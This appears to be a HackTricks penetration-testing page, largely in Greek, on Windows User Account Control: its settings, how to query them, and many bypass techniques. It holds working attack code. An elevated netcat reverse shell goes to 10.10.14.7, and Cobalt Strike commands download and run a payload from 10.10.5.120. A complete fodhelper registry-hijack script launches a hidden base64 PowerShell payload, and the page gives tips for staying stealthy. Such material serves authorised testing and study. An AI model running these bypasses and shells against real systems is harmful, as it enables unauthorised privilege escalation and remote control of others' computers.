# UAC - Έλεγχος Λογαριασμού Χρήστη

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) είναι μια λειτουργία που ενεργοποιεί ένα **πρότυπο συναίνεσης για ανυψωμένες ενέργειες**. Οι εφαρμογές έχουν διαφορετικά `integrity` επίπεδα, και ένα πρόγραμμα με **υψηλό επίπεδο** μπορεί να εκτελεί εργασίες που **θα μπορούσαν ενδεχομένως να θέσουν σε κίνδυνο το σύστημα**. Όταν το UAC είναι ενεργοποιημένο, οι εφαρμογές και οι εργασίες πάντα **εκτελούνται στο πλαίσιο ασφαλείας ενός λογαριασμού μη διαχειριστή** εκτός αν ένας διαχειριστής εξουσιοδοτήσει ρητά αυτές τις εφαρμογές/εργασίες να έχουν πρόσβαση επιπέδου διαχειριστή για να εκτελεστούν. Είναι μια λειτουργία άνεσης που προστατεύει τους διαχειριστές από ανεπιθύμητες αλλαγές αλλά δεν θεωρείται όριο ασφαλείας.

Για περισσότερες πληροφορίες σχετικά με τα integrity επίπεδα:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Όταν το UAC είναι ενεργό, σε έναν χρήστη διαχειριστή δίνονται 2 tokens: ένα κλειδί τυπικού χρήστη, για να εκτελεί τις κανονικές ενέργειες σε κανονικό επίπεδο, και ένα με τα προνόμια του διαχειριστή.

This [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) συζητά διεξοδικά πώς λειτουργεί το UAC και περιλαμβάνει τη διαδικασία σύνδεσης, την εμπειρία χρήστη και την αρχιτεκτονική του UAC. Οι διαχειριστές μπορούν να χρησιμοποιήσουν πολιτικές ασφαλείας για να ρυθμίσουν πώς λειτουργεί το UAC ειδικά για τον οργανισμό τους σε τοπικό επίπεδο (χρησιμοποιώντας secpol.msc), ή να το ρυθμίσουν και να το αναπτύξουν μέσω Group Policy Objects (GPO) σε περιβάλλον Active Directory. Οι διάφορες ρυθμίσεις συζητώνται με λεπτομέρεια [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Υπάρχουν 10 ρυθμίσεις Group Policy που μπορούν να οριστούν για το UAC. Ο παρακάτω πίνακας παρέχει επιπλέον λεπτομέρειες:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Απενεργοποιημένο                                            |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Απενεργοποιημένο                                            |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Ζήτηση διαπιστευτηρίων στην ασφαλή επιφάνεια εργασίας        |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Απενεργοποιημένο                                            |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Ενεργοποιημένο                                               |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Ενεργοποιημένο                                               |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Ενεργοποιημένο                                               |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Ενεργοποιημένο                                               |

### Θεωρία Παράκαμψης UAC

Ορισμένα προγράμματα ανεβαίνουν αυτόματα σε υψηλότερα προνόμια (autoelevated) αν ο χρήστης ανήκει στην ομάδα διαχειριστών. Αυτά τα δυαδικά περιέχουν μέσα στα _**Manifests**_ την επιλογή _**autoElevate**_ με τιμή _**True**_. Το δυαδικό πρέπει επίσης να είναι **υπογεγραμμένο από τη Microsoft**.

Πολλές διεργασίες auto-elevate εκθέτουν **λειτουργικότητα μέσω COM objects ή RPC servers**, η οποία μπορεί να κληθεί από διεργασίες που τρέχουν με μέσο επίπεδο `integrity` (δικαιώματα σε επίπεδο κανονικού χρήστη). Σημειώστε ότι COM (Component Object Model) και RPC (Remote Procedure Call) είναι μέθοδοι που χρησιμοποιούν τα Windows για να επικοινωνούν και να εκτελούν λειτουργίες μεταξύ διαφορετικών διεργασιών. Για παράδειγμα, το **`IFileOperation COM object`** έχει σχεδιαστεί για να χειρίζεται λειτουργίες αρχείων (αντιγραφή, διαγραφή, μετακίνηση) και μπορεί να ανεβάσει αυτόματα προνόμια χωρίς προτροπή.

Σημειώστε ότι ενδέχεται να εκτελεστούν κάποιοι έλεγχοι, όπως έλεγχος αν η διεργασία εκτελέστηκε από τον κατάλογο **System32**, ο οποίος μπορεί να παρακαμφθεί για παράδειγμα με **injecting into explorer.exe** ή σε άλλο εκτελέσιμο που βρίσκεται στο System32.

Ένας άλλος τρόπος παράκαμψης αυτών των ελέγχων είναι να **τροποποιηθεί το PEB**. Κάθε διεργασία στα Windows έχει ένα Process Environment Block (PEB), το οποίο περιλαμβάνει σημαντικά δεδομένα για τη διεργασία, όπως τη διαδρομή του εκτελέσιμου. Με την τροποποίηση του PEB, οι επιτιθέμενοι μπορούν να ψευδοποιήσουν (spoof) τη θέση της δικής τους κακόβουλης διεργασίας, κάνοντας να φαίνεται ότι τρέχει από έναν αξιόπιστο κατάλογο (όπως το system32). Αυτές οι ψευδείς πληροφορίες ξεγελούν το COM object ώστε να ανεβάσει προνόμια χωρίς να ζητηθεί προτροπή από τον χρήστη.

Στη συνέχεια, για να **παρακαμφθεί** το **UAC** (ανεβάζοντας τα δικαιώματα από **μέσο** επίπεδο `integrity` **σε υψηλό**) κάποιοι επιτιθέμενοι χρησιμοποιούν τέτοιου είδους δυαδικά για να **εκτελέσουν αυθαίρετο κώδικα**, διότι θα εκτελεστεί από μια διεργασία με **υψηλό επίπεδο integrity**.

Μπορείτε να **ελέγξετε** το _**Manifest**_ ενός δυαδικού χρησιμοποιώντας το εργαλείο _**sigcheck.exe**_ από τα Sysinternals. (`sigcheck.exe -m <file>`) Και μπορείτε να **δειτε** το **επίπεδο integrity** των διεργασιών χρησιμοποιώντας το _Process Explorer_ ή το _Process Monitor_ (των Sysinternals).

### Έλεγχος UAC

Για να επιβεβαιώσετε εάν το UAC είναι ενεργοποιημένο κάντε:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Αν είναι **`1`** τότε το UAC είναι **ενεργοποιημένο**, αν είναι **`0`** ή **δεν υπάρχει**, τότε το UAC είναι **απενεργοποιημένο**.

Στη συνέχεια, ελέγξτε **ποιο επίπεδο** έχει ρυθμιστεί:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- Αν **`0`** τότε, UAC δεν θα ζητήσει προτροπή (όπως **απενεργοποιημένη**)
- Αν **`1`** ο διαχειριστής **ζητείται για όνομα χρήστη και κωδικό** για να εκτελέσει το binary με υψηλά δικαιώματα (στο Secure Desktop)
- Αν **`2`** (**Always notify me**) η UAC θα ζητάει πάντα επιβεβαίωση από τον διαχειριστή όταν προσπαθεί να εκτελέσει κάτι με υψηλά προνόμια (στο Secure Desktop)
- Αν **`3`** όπως το `1` αλλά όχι απαραίτητα στο Secure Desktop
- Αν **`4`** όπως το `2` αλλά όχι απαραίτητα στο Secure Desktop
- αν **`5`**(**default**) θα ζητήσει από τον διαχειριστή να επιβεβαιώσει την εκτέλεση μη Windows binaries με υψηλά προνόμια

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, then, only the **RID 500** user (**built-in Administrator**) is able to perform **admin tasks without UAC**, and if its `1`, **all accounts inside "Administrators"** group can do them.

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), the **built-in Administrator account can** do remote administration tasks and if **`1`** the built-in account Administrator **cannot** do remote administration tasks, unless `LocalAccountTokenFilterPolicy` is set to `1`.

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Σημειώστε ότι αν έχετε γραφική πρόσβαση στο θύμα, το UAC bypass είναι απλό καθώς μπορείτε απλώς να κάνετε κλικ στο "Yes" όταν εμφανίζεται το UAC prompt

The UAC bypass is needed in the following situation: **το UAC είναι ενεργοποιημένο, η διαδικασία σας εκτελείται σε περιβάλλον μέσου επιπέδου ακεραιότητας, και ο χρήστης σας ανήκει στην ομάδα Administrators**.

It is important to mention that it is **much harder to bypass the UAC if it is in the highest security level (Always) than if it is in any of the other levels (Default).**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Πολύ** Βασικό UAC "bypass" (full file system access)

Αν έχετε ένα shell με έναν χρήστη που ανήκει στην Administrators group, μπορείτε να **mount the C$** κοινόχρηστο μέσω SMB (file system) τοπικά σε έναν νέο δίσκο και θα έχετε **πρόσβαση σε όλα μέσα στο file system** (ακόμα και στον Administrator home folder).

> [!WARNING]
> **Φαίνεται ότι αυτό το κόλπο δεν λειτουργεί πια**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Οι τεχνικές Cobalt Strike θα λειτουργήσουν μόνο αν το UAC δεν είναι ρυθμισμένο στο μέγιστο επίπεδο ασφάλειας.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** και **Metasploit** έχουν επίσης αρκετά modules για να **bypass** το **UAC**.

### KRBUACBypass

Τεκμηρίωση και εργαλείο στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) το οποίο είναι μια **συλλογή** από αρκετά UAC bypass exploits. Σημειώστε ότι θα χρειαστεί να **compile UACME using visual studio or msbuild**. Η μεταγλώττιση θα δημιουργήσει αρκετά εκτελέσιμα (όπως `Source\Akagi\outout\x64\Debug\Akagi.exe`) , θα πρέπει να ξέρετε **ποιο χρειάζεστε.**\
Θα πρέπει **να είστε προσεκτικοί** γιατί κάποια bypasses θα **προκαλέσουν την εμφάνιση προτροπών σε κάποια άλλα προγράμματα** που θα **ειδοποιήσουν** τον **χρήστη** ότι κάτι συμβαίνει.

Το UACME περιλαμβάνει την **build version από την οποία κάθε technique άρχισε να λειτουργεί**. Μπορείτε να αναζητήσετε μια technique που επηρεάζει τις εκδόσεις σας:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Επίσης, χρησιμοποιώντας [this](https://en.wikipedia.org/wiki/Windows_10_version_history) παίρνετε την έκδοση Windows `1607` από τους αριθμούς build.

### UAC Bypass – fodhelper.exe (Registry hijack)

Το trusted binary `fodhelper.exe` είναι auto-elevated σε σύγχρονα Windows. Όταν εκκινείται, ερωτά την per-user registry path παρακάτω χωρίς να επικυρώνει το verb `DelegateExecute`. Τοποθετώντας μια εντολή εκεί επιτρέπει σε μια Medium Integrity process (ο χρήστης είναι στους Administrators) να spawn-άρει μια High Integrity process χωρίς UAC prompt.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Βήματα PowerShell (ορίστε το payload σας, και μετά εκτελέστε):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Σημειώσεις:
- Λειτουργεί όταν ο τρέχων χρήστης είναι μέλος των Administrators και το επίπεδο UAC είναι προεπιλεγμένο/επιεικές (όχι Always Notify με επιπλέον περιορισμούς).
- Χρησιμοποιήστε τη διαδρομή `sysnative` για να ξεκινήσετε ένα 64-bit PowerShell από μια 32-bit διεργασία σε 64-bit Windows.
- Το payload μπορεί να είναι οποιαδήποτε εντολή (PowerShell, cmd, ή μια διαδρομή EXE). Αποφύγετε UI που εμφανίζουν προτροπές για λόγους stealth.

#### Περισσότερες παρακάμψεις UAC

**Όλες** οι τεχνικές που χρησιμοποιούνται εδώ για να παρακαμφθεί η AUC **απαιτούν** ένα **πλήρες διαδραστικό shell** με το θύμα (ένα κοινό nc.exe shell δεν αρκεί).

Μπορείτε να το πετύχετε χρησιμοποιώντας μια συνεδρία **meterpreter**. Μεταναστεύστε σε μια **διαδικασία** που έχει την **Session** τιμή ίση με **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ θα πρέπει να λειτουργεί)

### Παράκαμψη UAC με GUI

Αν έχετε πρόσβαση σε **GUI μπορείτε απλώς να αποδεχτείτε το UAC prompt** όταν το λάβετε, δεν χρειάζεστε πραγματικά παρακάμψη. Έτσι, η πρόσβαση σε GUI θα σας επιτρέψει να παρακάμψετε το UAC.

Επιπλέον, αν αποκτήσετε μια GUI συνεδρία που κάποιος χρησιμοποιούσε (πιθανόν μέσω RDP) υπάρχουν **κάποια εργαλεία που θα τρέχουν ως administrator** από όπου θα μπορούσατε να **τρέξετε** ένα **cmd**, για παράδειγμα, **ως admin** απευθείας χωρίς να σας ζητηθεί ξανά από το UAC, όπως [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Αυτό μπορεί να είναι πιο **stealthy**.

### Θορυβώδης brute-force παράκαμψη UAC

Αν δεν σας ενδιαφέρει ο θόρυβος μπορείτε πάντα να **τρέξετε κάτι σαν** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) που **ζητά να αυξήσει τα δικαιώματα μέχρι ο χρήστης να τα αποδεχτεί**.

### Η δική σας παράκαμψη - Βασική μεθοδολογία παράκαμψης UAC

Αν ρίξετε μια ματιά στο **UACME** θα παρατηρήσετε ότι **οι περισσότερες παρακάμψεις UAC εκμεταλλεύονται μια ευπάθεια Dll Hijacking** (κυρίως γράφοντας το κακόβουλο dll στο _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Βρείτε ένα binary που θα **autoelevate** (ελέγξτε ότι όταν εκτελείται τρέχει σε υψηλό επίπεδο ακεραιότητας).
2. Με το procmon βρείτε γεγονότα "**NAME NOT FOUND**" που μπορεί να είναι ευάλωτα σε **DLL Hijacking**.
3. Πιθανότατα θα χρειαστεί να **γράψετε** το DLL μέσα σε μερικές **προστατευμένες διαδρομές** (όπως C:\Windows\System32) όπου δεν έχετε δικαιώματα εγγραφής. Μπορείτε να παρακάμψετε αυτό χρησιμοποιώντας:
   1. **wusa.exe**: Windows 7, 8 και 8.1. Σας επιτρέπει να εξαγάγετε το περιεχόμενο ενός CAB αρχείου σε προστατευμένες διαδρομές (επειδή αυτό το εργαλείο εκτελείται σε υψηλό επίπεδο ακεραιότητας).
   2. **IFileOperation**: Windows 10.
4. Ετοιμάστε ένα **script** για να αντιγράψετε το DLL σας μέσα στη προστατευμένη διαδρομή και να εκτελέσετε το ευάλωτο και autoelevated binary.

### Άλλη τεχνική παράκαμψης UAC

Συνίσταται στο να παρακολουθείτε αν ένα **autoElevated binary** προσπαθεί να **διαβάσει** από το **registry** το **όνομα/διαδρομή** ενός **binary** ή **εντολής** που θα **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το binary αναζητά αυτή την πληροφορία στο **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
